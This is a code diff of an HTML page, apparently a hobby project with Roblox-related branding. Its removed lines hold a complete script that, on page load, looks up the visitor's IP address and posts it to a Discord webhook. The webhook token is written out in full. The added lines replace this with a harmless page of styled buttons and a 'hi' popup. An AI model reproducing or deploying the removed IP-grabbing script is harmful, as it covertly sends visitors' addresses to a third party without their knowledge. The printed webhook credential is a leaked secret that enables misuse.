@@ -1,35 +1,106 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-    <title>ROBLOX</title>
+    <style>
+        /* Apply a dark gray background color to the entire page */
+        body {
+            background-color: #333; /* Use a dark gray color code like #333 */
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Style for the top rectangle */
+        .top-rectangle {
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent black background */
+            width: 100%;
+            padding: 20px; /* Adjust padding as needed */
+            box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.2); /* Add a shadow for depth */
+        }
+
+        /* Center the buttons within the top rectangle */
+        .button-container {
+            text-align: center;
+        }
+
+        /* Style for the buttons */
+        .button {
+            background-color: rgba(0, 0, 0, 0.5); /* Same color as the background */
+            color: white;
+            padding: 10px 20px; /* Adjust padding as needed */
+            border: none;
+            border-radius: 5px;
+            margin: 5px; /* Adjust margin as needed */
+            cursor: pointer;
+        }
+
+        /* Style for the dynamically created button and textbox */
+        .dynamic-content {
+            display: none; /* Initially hidden */
+            text-align: center;
+            margin-top: 20px; /* Adjust margin as needed */
+        }
+
+        /* Style for the dynamically created textbox */
+        #textbox {
+            background-color: rgba(0, 0, 0, 0.5); /* Same color as the background */
+            color: white;
+            padding: 10px; /* Adjust padding as needed */
+            display: none; /* Initially hidden */
+        }
+
+        /* Style for the "Show Textbox" button with the same background color as "Scripts" */
+        #show-textbox-button {
+            background-color: rgba(0, 0, 0, 0.5); /* Same color as the background */
+            color: white;
+            padding: 10px 20px; /* Match the padding */
+            border: none;
+            border-radius: 5px; /* Match the border radius */
+            margin: 5px; /* Match the margin */
+            cursor: pointer;
+            float: left; /* Push the button to the left */
+        }
+    </style>
 </head>
+
 <body>
+    <!-- Top Rectangle with Buttons -->
+    <div class="top-rectangle">
+        <div class="button-container">
+            <button class="button">Home</button>
+            <button class="button" id="scripts-button">Scripts</button>
+        </div>
+    </div>
+
+    <!-- Dynamic content area for the button and textbox -->
+    <div class="dynamic-content" id="dynamic-content">
+        <button class="button" id="show-textbox-button">Show Textbox</button>
+        <div id="textbox" style="display: none;">hi</div>
+    </div>
+
+    <!-- JavaScript to handle button clicks -->
     <script>
-        // JavaScript code to fetch the IP address
-        fetch('https://api64.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                const ipAddress = data.ip;
+        // Get references to the buttons and dynamic content
+        const scriptsButton = document.getElementById("scripts-button");
+        const dynamicContent = document.getElementById("dynamic-content");
+        const showTextboxButton = document.getElementById("show-textbox-button");
+        const textbox = document.getElementById("textbox");
 
-                // Send a POST request to the Discord webhook
-                const webhookURL = 'https://discord.com/api/webhooks/1128277448472154115/8CT2FKfneUURTulQs4yDy_UuzeYOcr3jdX5UJFxozV5J6_77M65uFf55lnLgjrmZ8JWB';
-                const message = { content:ipAddress};
+        // Add a click event listener to the "Scripts" button
+        scriptsButton.addEventListener("click", function () {
+            // Show the dynamic content
+            dynamicContent.style.display = "block";
+        });
 
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(message)
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Failed to send message to Discord webhook');
-                    }
-                })
-                .catch(error => console.error('Error:', error));
-            })
-            .catch(error => console.error('Error:', error));
+        // Add a click event listener to the "Show Textbox" button
+        showTextboxButton.addEventListener("click", function () {
+            // Hide other content
+            dynamicContent.style.display = "none";
+            // Open a new window with just the "hi" message
+            const newWindow = window.open("", "_blank");
+            newWindow.document.write("<div style='background-color: rgba(0, 0, 0, 0.5); color: white; padding: 10px;'>hi</div>");
+        });
     </script>
 </body>
+
 </html>
